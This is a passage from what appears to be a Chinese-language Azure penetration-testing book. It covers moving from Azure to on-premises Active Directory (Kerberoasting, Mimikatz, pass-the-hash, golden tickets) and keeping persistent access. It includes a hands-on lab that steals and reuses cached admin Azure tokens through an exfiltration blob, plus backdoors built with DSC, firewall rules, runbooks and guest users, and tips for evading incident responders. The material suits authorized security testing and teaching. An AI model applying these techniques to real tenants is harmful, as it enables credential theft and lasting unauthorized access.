  \ MFA 等安全策略的约束。\n\n攻击者可以利用具有服务主体或托管标识权限的 Azure AD 账户的特权，从而访问具有安全权限的主体。这是一条可行的路径，但你可能很少遇到这种情况，尤其是在组织严格遵循按范围分离角色分配原则的情况下。\n\
  \n#### 路径 2 – 利用服务主体的 API 权限\n\nMicrosoft 标识平台支持服务主体的两种权限：委派权限和应用程序权限。委派权限用于交互式身份验证流程，此时会有已登录的用户。在这种场景下，用户需要在访问时同意该权限（或者管理员可以代表用户同意）。\n\
  \n应用程序权限由无需任何用户交互即可运行的应用使用，这意味着没有用户登录这些应用。管理员只需代表应用对授予的权限同意一次。服务主体被授予权限，以便在 Microsoft\
  \ Graph 等 API 上执行敏感操作，这种情况并不少见。攻击者可以利用这些权限访问已授予该应用访问权限的 API。\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_290_0.png)\n\
  \n图 7.18 – 服务主体应用权限\n\n例如，某个应用可能没有在 Azure AD 中分配任何角色，但如果它在 Microsoft Graph 中拥有执行敏感操作的应用程序权限，则可以将其作为间接访问\
  \ Azure AD 的方式。这种攻击方式也正逐渐成为攻击者常用的网络钓鱼技术。攻击者可以使用 Azure AD 同意授权 URL（*图 7.19*），将合法的\
  \ Azure URL 发送给网络钓鱼受害者。此 URL 利用内置的 Azure AD 权限审批流程，允许用户批准外部应用程序。\n\n由于在内部环境中进行权限提升存在许多潜在方式，因此我们将重点介绍一些通用概念，并利用这些概念从\
  \ Azure 转向本地系统。\n\n### 识别与本地网络的连接\n\n首先，我们将了解如何识别连接云环境与本地网络的网络连接。这些连接可以让我们转向其他网络，而这些网络可能有助于我们在整个\
  \ Active Directory 环境中实现权限提升。\n\n> **重要说明**\n>\n> 由于此场景的实验环境需要你设置与另一个网络的连接，因此我们不会在动手实践中介绍这一内容。但我们将说明如何查找这些连接。\n\
  \n在 Azure 门户中，查找本地连接是一项简单的任务。只需导航到**连接**页面，即可看到可用连接列表。这些连接可能是**站点到站点 VPN**或**ExpressRoute**连接。\n\
  \n#### 站点到站点（IPsec）连接\n\n站点到站点连接依赖传统网络硬件（VPN 集中器、路由器等），在 Azure 与另一个网络之间建立 VPN 隧道。许多组织会选择此选项，因为它允许组织与现有技术集成。站点到站点连接的主要区别之一在于，其流量会通过公共互联网传输，而不是通过私有骨干网络连接传输。\n\
  \n#### ExpressRoute 连接\n\n对于希望从其网络到 Azure 建立更专用（且更私密）连接的组织而言，ExpressRoute 连接是首选方案。此类连接通常由与\
  \ Microsoft 建立合作关系的服务提供商为组织创建。\n\n了解这些连接的工作原理基础知识固然有益，但我们真正关注的是如何利用这些连接攻击其他网络。由于会使用虚拟网关来创建这些连接，因此我们需要检查网关的设置，以确定哪些网络可以访问远程连接。\n\
  \n通常情况下，如果我们拥有订阅上的参与者（或所有者）角色，就应该能够访问虚拟网络中可访问该连接的虚拟机资源。在最坏的情况下，我们始终可以在适当的虚拟网络中创建新的虚拟机，或者将网络接口附加到现有虚拟机。\n\
  \n获得本地网络的访问权限以及一些域凭据后，我们需要寻找在域中提升权限的可用选项。接下来的章节将介绍一些常见的选项和工具。\n\n### 识别域权限提升路径\n\
  \n由于我们假设已经提升到所有者角色，或者拥有可访问多个订阅的账户，因此我们将假设在此过程中某个阶段已经收集到了一些域凭据。如果没有，我们建议返回前面的章节，复习如何从虚拟机和\
  \ PaaS 服务中提取域凭据。\n\n利用这些已获取的域凭据，我们需要使用工具来识别 Active Directory 域中的资源，并利用这些资源提升权限。在许多环境中，需要在多个系统之间进行多次跳转，才能获得域管理员权限。\n\
  \n例如，下面是一个与 Azure 资源集成的 Active Directory 域（`ACME.local`）中常见的域权限提升路径：\n\n- 攻击者从 Active\
  \ Directory 或 Azure 虚拟机中收集域凭据（密码猜测、网络协议攻击等）。\n- 攻击者利用这些凭据，在 Kerberoasting 攻击过程中获取可破解格式的\
  \ Kerberos 票据。\n- 票据被破解，暴露出关联服务账户（`ACME\\SQLUser1`）的明文凭据。\n- 该服务账户在 AD 服务器计算机组上拥有本地管理员权限。\n\
  - 该组中的一台服务器（`FileServer01`）上存在账户 `ACME\\kfosaaen-DA` 的活动登录会话，该账户是域管理员。\n- 攻击者使用\
  \ SQLUser1 服务账户凭据，以本地管理员身份登录 `FileServer01` 服务器，并使用 Mimikatz 从 LSASS 进程中转储域管理员凭据。\n\
  \n\n\n\n\n撰写本文时，这是一种可在 Active Directory 域中使用的常见提权路径。这是一条可通过收集一些基本域信息（服务主体、域组等）手动识别的路径，但也有工具可帮助自动化识别这些路径。我们将在下一节中介绍其中一些工具，以及有助于在系统之间进行横向移动的额外工具。\n\
  \n### 自动化识别提权路径\n\nBloodHound 工具的创建是为了简化 Active Directory 提权路径的识别。该工具允许域用户收集有关域中活动主机和用户会话的关键信息，以帮助将权限串联成一个图。该图随后可以被解析以找到到达所需权限的最直接路径：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_294_0.png)\n\n图 7.20 – BloodHound 图示例\n\
  \n使用我们之前的示例，攻击者可以收集域数据，并通过使用 BloodHound 轻松找到从 Kerberoasting 攻击到域管理员权限的路径。\n\n> **BloodHound\
  \ 信息**\n> \n> **创建者：** Andrew Robbins (Twitter: @wald0)、Rohan Vazarkar (Twitter:\
  \ @CptJesus) 和 Will Schroeder (Twitter: @harmj0y)\n> \n> **开源或商业：** 开源项目；提供商业选项\n\
  > \n> **GitHub 仓库：** `https://github.com/BloodHoundAD/BloodHound`\n> \n> **语言：**\
  \ PowerShell, JavaScript\n\n得益于工具的最新更新，BloodHound 还支持查找本章中提到的许多 Azure 攻击路径。绘制 Azure\
  \ 角色和资源关系图的能力对于识别在 Azure 中横向移动和提权的方式非常有帮助。虽然我们不会介绍该工具的完整使用方法，但它是在攻击 Active Directory\
  \ 时最强大的工具之一，强烈推荐用于 Active Directory 测试。\n\n> **重要说明**\n> \n> 由于为 BloodHound 收集 Azure\
  \ 数据而搭建实验室需要订阅中进行一些专门的资源分配，我们选择不为此工具提供实验。如果你想查看它收集的一些数据，请随意运行之前章节中的任何构建脚本，运行 AzureHound\
  \ 收集工具，然后将数据导入 BloodHound。\n\n虽然这超出了本书的范围，但有大量工具可用于单独收集与 BloodHound 收集的类似信息。如果操作得当，这种分块收集域信息的方式在渗透测试期间可能比\
  \ BloodHound 收集方法更不明显，但它需要对数据进行更多手动解释（以及对攻击路径的具体了解）才能识别出 BloodHound 找到的相同路径。\n\n\
  ### 用于沿提权路径进行横向移动的工具\n\n有了在本地环境中进行横向移动的明确路径，我们需要一些工具来帮助我们自动化此过程，使工作更轻松。值得庆幸的是，许多常见的提权操作可以从非域加入的系统完成，无需自定义工具。然而，在评估期间保持低调的最佳方法之一是通过\
  \ *利用现有资源* 使用原生系统管理工具（RDP、PS Remoting 等）。\n\n由于原生 Windows 工具没有对诸如凭据收集和进程迁移等功能的固有支持，可能需要额外的工具来完成我们的目标。由于这些工具中的每一个都可能有自己的专著，我们只在此简要介绍其中一些，并留给读者自行学习这些工具：\n\
  \n- Metasploit\n- CrackMapExec\n- Cobalt Strike\n- Empire\n- Red Team Toolkit\n\
  - Covenant\n\n这些工具都可用于域中的横向移动和提权。虽然工具并不总是必需，但它们可以帮助简化一些工作。\n\n虽然这始终会受到环境中可用路径的影响，但在提权期间在域环境中在系统之间进行横向移动时，我们通常会使用以下方法：\n\
  \n- 获取域或本地凭据。\n- 使用凭据或漏洞利用获得对系统的本地管理员访问权限。\n- 攻破系统上可用的凭据。\n- 识别可用于横向移动的额外目标。\n-\
  \ 横向移动到额外目标，并重新开始循环。\n\n一旦在上述过程中收集到域管理员凭据，我们就进入新阶段，在该阶段收集特权 Azure 用户的凭据并使用它们进入 Azure\
  \ 租户。\n\n接下来，我们将介绍在域内完成提权后该怎么做。\n\n### 域提权和横向移动后的通用提示\n\n域管理员权限不应成为内部网络渗透测试的终点。在域管理员处停止只表明你对域有完全控制权，但没有展示这些权限的潜在影响。在内部渗透测试中，攻击者可以利用这些特权访问敏感数据存储，并强调攻击者提权后可能造成的危险。\n\
  \nAzure 渗透测试同样适用。获得域管理员权限实际上应该只是我们作为特权用户重新进入 Azure AD 环境的立足点。由于 Azure AD 环境与主要 Active\
  \ Directory 环境紧密相连，因此有许多选择可以控制 Active Directory 账户，从而使我们能够进入 Azure。\n\n获得域管理员权限后的第一步应该是从域控制器收集域\
  \ NTLM 哈希。这将为我们带来以下机会：\n\n- 破解收集到的哈希以获得明文凭据\n- 使用密码哈希进行 **Pass-the-Hash (PtH)**\
  \ 攻击\n- 使用域 `krbtgt` 账户哈希通过黄金票据攻击在域中保持持久性\n\n由于转储所有域哈希可能会产生一些噪音，你可能希望针对特定账户（krbtgt、域/全局管理员等）进行哈希转储。此外，负责你的域的人员可能不希望重置每个域密码，因此在转储域哈希时做出合理的选择。\n\
  \n为了演示的目的，假设我们已经收集了 Azure 租户中 Global Administrator 账户的所有域 NTLM 哈希。如果我们能够破解其中任何一个哈希，我们可能能够使用明文凭据以特权角色进入\
  \ Azure 租户。\n\n你可能会认为所有这些特权账户都会受到 MFA 和条件访问策略的保护。这并不总是如此。虽然强制所有账户使用 MFA 变得越来越普遍，但作者经常遇到用户被授予特权\
  \ Azure AD 角色，但从未为该账户配置 MFA 的情况。你的实际情况可能有所不同，但尝试一下可能值得。\n\n或者，我们可以使用收集到的域凭据（明文或哈希）用于特权用户，以访问\
  \ Azure 管理员使用的系统。如前所述，Azure 令牌可以存储在用户工作站的 `.Azure` 配置文件文件夹中。通过使用其中一个被攻破的特权账户访问工作站，我们可能能够冒充\
  \ Azure 管理员用户的令牌。我们将在下一章深入介绍此过程，作为在环境中获得持久性的方式。\n\n最后，有了管理员权限，我们可能可以控制用于 Azure 环境的\
  \ MFA 系统。如果使用第三方（Okta、Duo 等）MFA 系统，特权域用户可能可以控制其他用户的令牌。通过破解 Global Administrator\
  \ 的密码并为其授予新的 MFA 令牌（在你的设备上），你可能能够接管其 Azure 账户。\n\n\n\n\n\n### 总结\n\n在本章中，我们回顾了攻击者可能从订阅所有者角色提升到租户中特权\
  \ Azure AD 角色的多种方式。我们还回顾了攻击者如何利用 Azure AD 访问权限来获得租户内订阅的权利。虽然在 Azure 渗透测试中并不总是需要这样做，但在订阅和\
  \ Azure AD 之间切换可能是展示环境中权限提升全面影响的最佳方式之一。\n\n在下一章（也是最后一章）中，我们将展示如何利用这种访问权限，在 Azure\
  \ 租户的各个层级为自己创造持久化机会。从虚拟机到 Azure AD，我们将回顾在 Azure 租户中持久化访问的可用选项。\n\n### 做好被发现的计划\n\
  \n在任何你想在环境中持久化的情况下，你都应该假设你的存在会被注意到，并且你的访问权限会被移除。你的初始访问向量应始终被视为*短期资源*，它们允许你设置额外的持久化选项。虽然你也许能够通过那些初始向量维持访问权限，但它们很可能是第一个被暴露的东西。\n\
  \n### 准备多条通道\n\n通过为一个环境准备多种访问选项，你不仅为自己提供了恢复被移除访问权限的选项，还拥有多条通道，可以迷惑任何正在对该环境进行事件响应的人。通过用一个你愿意牺牲的通道制造更大的动静，可能更容易在一个账户或服务中隐藏你的某些活动。\n\
  \n让我们看一些例子：\n\n- 使用 Azure AD 用户通过运行命令功能直接执行 VM 命令。这是一个相当明显的操作，很容易追踪到单个用户。\n- 通过自动化帐户\
  \ Runbook，使用运行命令功能并以运行方式帐户间接执行 VM 命令。这会以运行方式帐户作为掩护，可能不太明显。\n\n拥有这两种命令执行选项，你就有可能用租户中的其他有效操作来掩盖你的活动。这两种选项中的任何一种也可能是一个危险信号，可以在你完成其他操作时用来分散事件响应团队的注意力。\n\
  \n### 使用长期和短期通道\n\n通过使用长期持久化通道来创建或恢复对短期通道的访问，你可以在需要时牺牲短期资源。长期持久化方法应具有较高权限（订阅所有者、AAD\
  \ 租户权限等），并允许你创建新资源或为租户分配新权限。这些才是真正的持久化方法，能帮助你保持或恢复对租户的整体访问权限。长期通道也应谨慎使用，因为它们对持久化至关重要。使用得越少，产生的噪音就越少。\n\
  \n### 在多个层级拥有多个持久化选项\n\n对于你创建的任何持久化通道，最好在每个层级都有多个短期和长期选项。这可以包括多个资源、用户、脚本、可执行文件以及你可能使用的任何其他工具。通过在多个层级为自己提供选项，如果访问权限丢失，你将能够在多个层级重新建立访问权限。这里的目标是保持访问的粘性，以便移除你访问权限的尝试是可逆的。\n\
  \n> **重要提示**\n>\n> 与任何优秀的渗透测试一样，文档记录是关键。你在订阅中添加的任何持久化选项（或重大状态更改）都需要在创建时记录下来。如果环境访问完全丢失，并且你无法清理你的持久化方法，你可能会遇到一个非常愤怒的环境所有者，他需要做一些清理工作。此外，测试的**参与规则（RoE）**应概述测试人员为提升权限、持久化或其他目的对环境进行任何更改的能力。\n\
  \n现在我们理解了在 Azure 环境中持久化的一般目标和方法，接下来看看我们在 Azure 订阅和管理组中持久化的选项。\n\n### 在 Azure 订阅中持久化\n\
  \nAzure 订阅中的持久化可以通过订阅中的多个不同服务来建立。这包括订阅（或管理组）级别的 Azure AD 账户访问权限，一直到资源级别。由于对更广泛订阅的访问权限将由你的身份（用户账户、服务主体、托管身份）控制，你需要在多个层级拥有选项，以维持（或重新获得）对这些身份的访问权限。\n\
  \n首先，我们将研究如何为已认证用户收集现有的订阅令牌。这是一种通过正常管理用户会话保持访问权限的非常实用的方式。\n\n#### 从系统中窃取凭据\n\n根据你的测试范围，你可能会发现自己处于内部网络环境或\
  \ Azure VM 中，并希望在该租户中持久化。虽然我们可以很容易地论证将你的权限提升到域管理员账户并入侵 AD 同步服务器，但这并不总是一个实际可行的选项。\n\
  \n要获得更隐蔽的选项，你可能会考虑利用现有 Azure 用户的系统。一旦你进入 Azure 用户的系统，你有几个选择。\n\n如果你可以访问实际的用户账户，你也许能够利用\
  \ Web 浏览器中现有的 Azure 门户会话。或者，系统也可能配置为使用直通**单一登录（SSO）**，因此以该用户身份在 Internet Explorer\
  \ 中打开 `https://portal.azure.com` 可能会让你直接进入。\n\n> **重要提示**\n>\n> 这里介绍的技术已在 Lares\
  \ 博客上由 *Lee Kagan* 撰写的文章中介绍过：`https://www.lares.com/blog/hunting-azure-admins-for-vertical-escalation/`。有关此特定攻击的更多信息，请参阅该文章。\n\
  \n如果该用户有一些账户限制，例如多因素身份验证或条件访问策略，你最好的选择是从 Az CLI 和/或 Az PowerShell cmdlet 导出任何现有的身份验证令牌。这些令牌通常存储在\
  \ Windows 操作系统客户端的 `c:\\Users\\%USERNAME%\\.Azure` 目录中。请记住，你正在攻击的用户可能正在清理其系统上的缓存凭据，因此不能保证某个特定用户在其系统上存储了有效的\
  \ Azure 凭据。\n\n##### 从管理员系统导出 PS/AZ 凭据\n\n如果你无法访问明文用户账户凭据，你仍然可以在 `.Azure` 文件夹中查找现有的活动令牌。这很可能要求你拥有系统的本地管理员访问权限，请记住这一点：\n\
  \n#### 动手练习 – 从已认证的 Azure 管理员系统窃取并重用令牌\n\n在本练习中，我们将从已认证的 Azure 管理员用户的系统中导出缓存令牌，并在我们的渗透测试\
  \ VM 上重用这些令牌。以下是我们将在本练习中完成的任务：\n\n- **任务 1：** 使用 Az PowerShell 模块向我们的 Azure 租户进行身份验证。\n\
  - **任务 2：** 确认访问权限（列出订阅）。\n- **任务 3：** 使用 `Save-AzContext` 命令。\n- **任务 4：** 将上下文文件复制到另一个系统以供其他地方使用。\n\
  \n让我们开始吧：\n\n1. 在 Cloud Shell 窗格中的 PowerShell 会话中，运行以下命令以下载并验证用于配置本练习场景的脚本：\n\n\
  ```\nInvoke-WebRequest -Uri http://bit.ly/admin-token-theft-scenario -OutFile admin-token-theft-scenario-windows.ps1\n\
  \nGet-ChildItem\n```\n\n以下截图显示了输出结果：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_306_0.png)\n\
  \n图 8.2 – 下载并验证脚本\n\n\n\n\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_309_0.png)\n\
  \n5. 在连接到 **Windows VM 公共 IP** 的 RDP 会话中，打开 PowerShell 控制台，并使用**以下**命令对 Azure 进行身份验证：\n\
  \n```powershell\nConnect-AzAccount\n```\n\n以下是该命令及其输出的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_314_0.png)\n\
  \n13. 使用以下命令下载并验证被窃取的上下文文件。将 `<blob_container_url>` 占位符替换为你从脚本输出中复制的**外泄存储位置**的值：\n\
  \n```powershell\nInvoke-WebRequest -Uri \"<blob_container_url>\" -OutFile azureprofile.zip\n\
  Get-ChildItem azureprofile.zip\n```\n\n以下是该命令及其输出的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_314_1.png)\n\
  \n14. 使用以下命令解压已下载的文件，并验证解压后的文件：\n\n```\n7z e azureprofile.zip\n```\n\n```\nGet-ChildItem\
  \ -Filter azureprofile.*\n```\n\n以下是第一个命令及其输出的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_315_0.png)\n\
  \n图 8.15 – 解压已下载的压缩 ZIP 文件\n\n以下截图是第二个命令及其输出：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_315_1.png)\n\
  \n图 8.16 – 查看解压后的凭据\n\n15. 使用以下命令将身份验证上下文恢复到你的渗透测试 VM：\n\n```\nImport-AzContext\
  \ -Path .\\azureprofile.json\n```\n\n以下是该命令及其输出的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_317_0.png)\n\
  \n图 8.19 – 下载清理脚本\n\n18. 使用以下命令运行下载的脚本，以清理为本练习创建的资源：\n\n```powershell\n./admin-token-theft-scenario-windows-cleanup.ps1\n\
  ```\n\n以下是该命令及其输出的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_317_1.png)\n\n\
  图 8.20 – 运行清理脚本\n\n> **脚本有什么作用？**\n> \n> 该脚本会移除并清理之前创建的以下对象和资源：\n> \n> a. 用于模拟管理员系统的\
  \ Windows 管理员 VM\n> \n> b. 包含 Blob 容器的存储帐户，该容器曾用于存储从 Windows 管理员 VM 窃取的凭据\n> \n\
  > c. 凭据被窃取的 `victimadminuser` 帐户\n\n至此，你已经成功地从管理员系统中窃取了一个 Azure 凭据，并将其导入到你的系统中。接下来，我们将介绍在一组单独的\
  \ Azure 服务中维持持久化的可用选项。这些服务可以在多个层面启用远程访问，并提供对资源和租户的持久访问。\n\n如果为了完成这种持久化而创建任何新资源，你应该利用现有的标记和资源命名结构，以与现有资源融为一体。一般来说，最好坚持使用订阅中的现有服务来融入其中，但具体取决于你的可用选项，你可能不得不创建一些可能超出租户正常基础设施范围的新资源。\n\
  \n### 通过虚拟机维持持久化\n\n首先，我们将了解如何利用**虚拟机（VM）**来维持对 Azure 环境的访问。由于虚拟机经常加入更大的 Active\
  \ Directory 域，因此它们可用于同时在 Azure 和 Active Directory 中维持持久化。\n\n作为入门，我们将简要介绍使用**命令与控制（C2）**植入程序在\
  \ Azure VM 中启动持久化。有许多商业和开源工具可用（如 Cobalt Strike、Covenant、PowerShell Empire 等），它们通常用于获取系统的初始访问权限。我们可以在\
  \ Azure VM 上使用这些初始植入可执行文件，以便在 VM 上开始进行持久化操作。\n\n> **重要说明**\n> \n> 请记住，许多*现成的* C2\
  \ 工具可能会被端点保护软件检测到。在将载荷部署到 VM 之前，你可能需要采取额外步骤来混淆载荷。\n\n这些植入程序可以通过以下几种方式部署到 VM 上：\n\
  \n- 使用 VM Run 命令功能\n- 作为自定义脚本扩展\n- 直接 RDP 访问系统\n- 使用 DSC 配置（我们稍后将介绍）\n\n一旦在这些系统上建立了初始部署和持久化，这些植入程序将允许我们在系统上执行命令，并保持对\
  \ VM 本身的访问。这为我们提供了对宿主机操作系统级别的访问权限，但并不保证对域或 AAD 的访问。\n\n由于 C2 植入程序的执行很大程度上依赖于 VM，因此本章不会过多关注这一部分。但请将其视为一种可选方案，因为我们正在讨论不同的持久化方法，而这些方法可能允许在\
  \ VM 上执行命令。\n\n### 开放管理端口\n\n作为在虚拟机上使用 C2 植入程序的替代方案，我们可以向自己的 IP 地址开放管理端口，以便使用我们已知的凭据远程访问\
  \ VM。如前所述，有多种方法可以获取（或设置）VM 的本地管理员凭据，我们可以使用这些凭据远程管理系统。\n\n这并不是理想的解决方案，因为在渗透测试期间，向互联网开放端口通常是一种糟糕的做法。此外，向特定\
  \ IP 地址开放端口会让应急响应团队看到你的 IP 地址，从而让他们很容易追查到你的系统。这种方法也可以扩展到 Azure PaaS 服务（Azure SQL\
  \ 数据库、密钥保管库等），但这是一种特别容易暴露的维持访问的方法，因此我们建议除非确实需要，否则应避免使用。\n\n另一个不太容易暴露的选项是，在网络安全组中开放端口时，将\
  \ Azure 服务标记指定为源。服务标记让我们能够定义不那么可疑的后门。例如，修改网络安全组以允许来自 AzureCloud 服务标记或 AzureCloud.UKSouth\
  \ 服务标记的 RDP 或 SSH 流量，对安全运营团队来说可能看起来不那么可疑，同时仍然允许来自任何范围与指定源匹配的 Azure 节点的连接。\n\n###\
  \ 添加托管标识\n\n通过向 VM 添加托管标识（系统分配或用户分配），我们有可能为自己授予对租户中其他 Azure 资源的访问权限，以实现持久化。这需要我们完成以下步骤：\n\
  \n1. 在 Azure 门户中导航到目标 VM。\n2. 为 VM 分配系统分配或用户分配的托管标识。\n3. 在订阅/管理组和/或 Azure AD 级别为托管标识分配额外权限。从渗透测试的角度来看，我们需要小心，不要添加可能使环境容易遭受更广泛攻击的权限。\n\
  \n这个过程将为我们留下一个托管标识，只要我们仍有权访问 VM 和所附加的托管标识，就可以使用该标识访问 Azure（以及潜在的 Azure AD）资源。如前所述，这可能是一个很好的机会，可以将你的长期选项分开，使用一个托管标识进行订阅管理，使用另一个托管标识访问\
  \ Azure AD：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_320_0.png)\n\n此外，使用一个现有的、已具备我们想要用于持久化的权限的用户分配托管标识，可能比使用系统分配的托管标识更不易暴露，因为系统分配的托管标识之后仍需要授予权限（图\
  \ 8.21）。\n\n还应注意，当虚拟机上没有预先存在的托管标识时，此方法效果最佳。作为测试人员，我们希望避免做出任何可能干扰现有标识分配的重大状态更改。使用托管标识进行持久化的方法同样适用于**平台即服务（PaaS）**服务（App\
  \ Service、AKS 等）。\n\n### 自动化帐户 DSC\n\n尽管这与我们下一节的内容有些契合，但自动化帐户服务中的**所需状态配置（DSC）**功能是一个我们可以用来在\
  \ Azure VM 上维持访问的功能。DSC 功能通常用于确保系统已配置为所需配置，如果该配置发生更改，DSC 将调整配置，使其处于所需状态。\n\n\n通过为虚拟机（VM）提供“运行我的恶意可执行文件”的“期望状态”，我们可以确保自己想要在虚拟机上运行的代码能够持续运行。\n\
  \n> **重要说明**\n>\n> 与本小节所述的技巧非常类似的一种技术（使用 VM DSC 扩展与自动化帐户 DSC 对比）已在 NetSPI 博客上由 Jake\
  \ Karnes 撰写的文章中更详细地介绍过：https://www.netspi.com/blog/technical/cloud-penetration-testing/azure-persistence-with-desired-state-configurations/.\n\
  \n例如，我们可以使用以下流程将 VM 连接到 DSC 服务并设置 *期望状态*，这会在 VM 上运行脚本：\n\n1. 将目标 VM 作为 DSC 节点添加到自动化帐户服务。\n\
  2. 上传配置。\n3. 编译配置。\n4. 将节点配置分配给 VM。\n5. 等待 DSC 指示节点不合规并运行 *修正* 脚本。\n\n对于配置，我们在*期望状态*方面有几种选择。从持久化的角度来看，我们可能希望有一个允许远程访问的配置。以下通用配置可用于确保我们的后门持续运行：\n\
  \n- 在 C 盘上应存在文件（`testfile.exe`），路径为 `C:\\testfile.exe`。\n- 系统应从特定路径（`C:\\testfile.exe`）运行一个进程。\n\
  - 如果任一条件不满足，则纠正该条件。\n\n请记住，让 DSC 正常运行可能有点麻烦，但它们在 Azure 界面中隐藏得很好，因此这将有助于保证执行不被察觉，并有望为你提供一种不错的持久化方法。\n\
  \n下面是我们可以使用具有特权 AAD 角色的运行方式帐户（Run as account）做的一个示例：\n\n1. 为运行方式帐户分配一个特权 AAD 角色（全局管理员、用户管理员等）。\n\
  2. 创建一个 Runbook，将新用户（使用已知密码）添加到 AAD 租户。\n3. 在 AAD 中为新用户分配一个特权角色。\n4. 使用新用户作为短期渠道来访问\
  \ AAD。\n\n最后，我们有多种执行这些 Runbook 的选项，以保持我们的访问权限。我们之前介绍了使用计划方法，但还有另一种方法可以用来启动 Runbook。**Webhook**\
  \ 方法可以成为触发持久化 Runbook 的好方法，即使你已经失去对环境的访问权限：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_323_0.png)\n\
  \n图 8.22 – 为自动化帐户创建新的 Webhook\n\nWebhook 是可用于远程触发自动化帐户 Runbook 的 URL。Webhook 的真正优势在于能够按需执行它们。虽然计划执行\
  \ Runbook 很有用，但它确实需要你等待设定时间才能再次运行作业。这会导致 Runbook 多次执行，从而可能使持久化方法更引人注目。通过使用 Webhook，你可以控制\
  \ Runbook 的运行时间，并限制它的执行次数。\n\n虽然自动化帐户在技术上属于 PaaS 服务，但它们对持久化非常有用，因此我们将它们单独放在一个小节中。接下来，我们将介绍\
  \ Azure 环境中可用于持久化的其他 PaaS 服务。\n\n### 保持对 PaaS 服务的持久化\n\nAzure 中的大多数平台服务在访问时既需要网络授权，也需要用户授权（*图\
  \ 8.23*）。要有效地实现持久化，必须从两个层面进行——网络持久化和用户持久化：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_324_0.png)\n\
  \n平台服务持久化最常见的目标是数据存储或机密存储，例如平台 SQL 数据库、存储帐户、Cosmos DB、容器注册表和密钥保管库。\n\n#### 保持对平台服务的网络持久化\n\
  \n根据资源配置的不同，网络访问可以通过公共端点或专用端点进行（*图 8.24*）。公共端点意味着可以从公共互联网访问该资源，而专用端点意味着可以从 Azure\
  \ 中的专用虚拟网络访问该资源。\n\n通过公共端点进行持久化需要修改已配置的授权 IP 范围，使其包含某个 IP 地址。这可以使用任意 Azure 管理工具或使用攻击性工具（如\
  \ Lava）来完成。例如，Lava 中的 `sql_backdoor_firewall_rule` 模块会修改平台 SQL 服务器的授权 IP 范围，使其包含指定的\
  \ IP（图 8.24）。可以想象，这种修改很容易引发安全运营团队的怀疑：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_325_0.png)\n\
  \n对于 Azure SQL 等服务，一种更隐蔽的方法可能是修改**防火墙例外**网络设置，以允许访问 **Azure 服务和资源**（图 8.25）。此设置允许访问任何\
  \ Azure IP 地址，包括属于其他组织的公共 IP 地址！请注意，此行为主要适用于 Azure SQL，而不适用于存储帐户、密钥保管库或容器注册表等具有网络限制的其他服务。我们建议谨慎使用：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_325_1.png)\n\n图 8.25 – 修改 Azure SQL 防火墙例外\n\
  \n#### 保持对平台服务的用户持久化\n\n根据资源配置的不同，用户访问可以使用**基于密钥的访问**（例如访问密钥）、**共享访问签名 (SAS)** 令牌，或**基于身份的访问**（通常使用\
  \ Azure AD）。我们在*第 6 章：利用 PaaS 服务上的贡献者权限*中学习了如何使用 MicroBurst 来收集密码和访问密钥。大多数平台服务访问密钥在泄露后都可以轻松重新生成。\n\
  \n对于 Azure 存储等服务，也可以生成授予存储资源特权访问权限的 SAS 令牌用于持久化。安全运营团队可能更难察觉到使用了此选项，因为该操作不会明确记录在活动日志中。\n\
  \n要使用基于身份的授权进行持久化，可以修改 RBAC 角色分配，为后门用户添加访问权限。我们将在下一节讨论在 Azure AD 中持久化的选项。\n\n###\
  \ 在 Azure AD 租户中持久化\n\n作为任何 Azure 环境的核心，Azure AD 租户是持久化的绝佳目标。一旦我们在租户内提升了权限，就可以使用多种选项来创建（或修改现有）安全主体，以在环境中保持持久化。通常，在\
  \ Azure AD 租户中创建新的安全主体可能比修改现有资源触发更多警报，但具体情况可能有所不同。\n\n作为持久化的一般路径，我们需要获取某个身份的访问权限，确保该身份具有必要的权限，并且（如果需要）创建策略例外以允许继续访问该身份。\n\
  \n为了识别此事件，安全运营团队可以在 Azure AD 审核日志（**Azure 门户 → Azure AD → 审核日志**）中查找 `Add application`\
  \ 或 `Add service principal` 活动类型或操作。\n\n#### 将来宾用户身份邀请到租户中\n\n为 Azure AD 租户获取后门身份的另一种方法是邀请来宾用户帐户。如果“协作限制”设置被设为最严格的选项，如图所示，这可能会更棘手。此设置可以在\
  \ **Azure 门户 → Azure AD → 用户设置 → 管理外部协作设置 → 协作限制** 中找到：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_330_0.png)\n\
  \n图 8.28 – 验证外部协作设置\n\n如果是这种情况，尝试修改此选项以添加其他域很可能会触发警报，因为配置此选项的组织很可能正在监视对该列表的修改。协作限制修改事件会在\
  \ Azure AD 审核日志中记录为 `Add policy` 操作。\n\n如果该设置已配置为最包容的选项，我们可以邀请来自通用域（如 `outlook.com`\
  \ 和 `gmail.com`）的用户进入租户。默认情况下，任何用户或来宾用户都可以用来邀请外部身份进入租户（*图 8.29*）！\n\n此设置可以在 **Azure\
  \ 门户 → Azure AD → 用户设置 → 管理外部协作设置 → 来宾邀请设置** 中找到：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_330_1.png)\n\
  \n图 8.29 – 验证来宾邀请设置\n\n\n\n需要注意的一点是，遵循良好安全实践的组织可能会对所有来宾身份应用一个整体条件访问策略（*图8.30*），以阻止他们访问敏感应用程序。如果是这种情况，如果我们有足够的权限修改条件访问策略，我们可以考虑绕过此策略的选项。我们将在本章后面介绍这一点：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_331_0.png)\n\n图8.30 – 外部用户的条件访问策略\n\n\
  由于许多组织可能会对租户中的外部身份保持更密切的关注，此选项很容易引起怀疑。要识别此事件，安全运营团队可以在Azure AD审核日志（**Azure门户 → Azure\
  \ AD → 审核日志**）中查找`Invite external user`活动类型或操作。\n\n### 修改现有身份\n\n作为获取后门身份的替代选项，我们将研究修改现有的Azure\
